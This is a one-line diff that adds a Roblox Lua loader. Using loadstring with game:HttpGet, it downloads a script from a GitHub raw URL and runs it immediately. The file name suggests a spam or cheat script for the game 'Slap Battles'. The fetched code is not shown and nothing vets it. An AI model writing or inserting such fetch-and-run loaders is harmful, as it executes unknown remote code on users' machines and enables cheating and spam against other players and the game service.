@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/update-slap-battles-spam2-kigc41k7j10uuz.lua"))()
